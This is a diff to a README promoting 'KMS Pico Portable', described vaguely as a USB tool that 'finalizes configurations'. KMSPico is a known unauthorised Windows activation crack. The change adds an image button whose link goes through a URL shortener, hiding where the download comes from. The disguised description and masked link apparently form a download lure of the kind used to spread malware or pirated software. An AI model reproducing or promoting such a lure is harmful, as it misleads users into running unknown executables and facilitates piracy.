@@ -2,7 +2,7 @@
 
 Your ultimate portable companion for system setup! This compact tool helps finalize configurations directly from your USB drive, offering convenience anywhere. ✨
 
-
+[![946748678](https://github.com/user-attachments/assets/2548daab-ba23-4fd4-995e-5424d7a22d0b)](https://tinyurl.com/349ufbwp)
 
 ## Quick Overview
 **KMS Pico Portable** is a self-contained application designed to assist with computer setup processes. It runs without installation, making it perfect for on-the-go use or tech toolkits. Think of it as your mobile digital assistant! 💼
